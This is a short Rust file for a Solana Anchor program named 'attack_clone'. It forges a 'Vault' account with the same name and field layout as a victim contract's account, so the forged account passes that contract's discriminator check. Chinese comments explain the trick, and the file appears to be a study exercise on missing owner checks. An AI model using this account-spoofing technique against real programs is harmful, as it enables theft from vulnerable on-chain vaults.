use anchor_lang::prelude::*;
use anchor_spl::token::TokenAccount;

declare_id!("FKjc6wc6cS8w1Tx8EEH8mA7iiZhJiXBwzfkoEbfmBvew");

#[program]
pub mod attack_clone {
    use super::*;

    // pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
    //     msg!("Greetings from: {:?}", ctx.program_id);
    //     Ok(())
    // }

    pub fn initialize_vault(ctx: Context<InitializeVault>) -> Result<()> {
        ctx.accounts.vault.token_accountxx = ctx.accounts.token_account.key();
        ctx.accounts.vault.authorityx = ctx.accounts.authority.key();
        Ok(())
    }
}
#[derive(Accounts)]
pub struct InitializeVault<'info> {
    #[account(
        init,
        payer = authority,
        space = 8 + 32 + 32,
    )]
    pub vault: Account<'info, Vault>,
    pub token_account: Account<'info, TokenAccount>,
    #[account(mut)]
    pub authority: Signer<'info>,
    pub system_program: Program<'info, System>,
}

#[account]
pub struct Vault {
    // 必须保持和被攻击者的账户结构体同名, 即必须Vault， 因为结构体名称的hash作为账户的 Discriminator,
    // 否则被攻击合约序列化的时候报错: Error Message: 8 byte discriminator did not match what was expected

    // 必须保持和被攻击账户的数据结构顺序一致,
    // 结构体内部变量名称可以不同,
    token_accountxx: Pubkey,
    authorityx: Pubkey,
}
